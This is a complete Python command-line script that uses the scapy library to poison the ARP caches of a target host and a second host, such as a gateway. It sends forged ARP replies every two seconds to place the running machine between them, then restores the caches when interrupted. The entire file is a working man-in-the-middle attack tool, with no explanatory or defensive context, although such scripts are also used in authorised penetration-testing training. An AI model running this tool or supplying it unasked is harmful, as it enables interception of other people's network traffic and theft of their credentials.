#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import time


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="IP to target. EX : 192.168.81.144")
    parser.add_argument("-s", "--spoof", dest="spoof", help="IP to spoof. EX : 192.168.81.2")
    options = parser.parse_args()
    if not options.target:
        parser.error("\n[-] Please specify a target IP, use --help for more info.")
    if not options.spoof:
        parser.error("\n[-] Please specify a spoof IP, use --help for more info.")
    return options.target, options.spoof


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip, mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwsrc=source_mac, hwdst=destination_mac, psrc=source_ip)
    scapy.send(packet, verbose=False)
    # print(packet.show())
    # print(packet.summary())


options = get_arguments()
target_mac = get_mac(options[0])
destination_mac = get_mac(options[1])
sent_packets_counts = 0

try:
    while True:
        spoof(options[0], options[1], target_mac)
        spoof(options[1], options[0], destination_mac)
        sent_packets_counts += 2
        print(f'\r[+] Packets sent : {str(sent_packets_counts)}', end="")

        # For Python 2.7 :
        # print('\r[+] Packets sent : ' + str(sent_packets_counts)),
        # sys.stdout.flush()

        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl+C.")
    restore_arp(options[0], options[1])
    restore_arp(options[1], options[0])
    print("[+] ARP tables have been restored.")



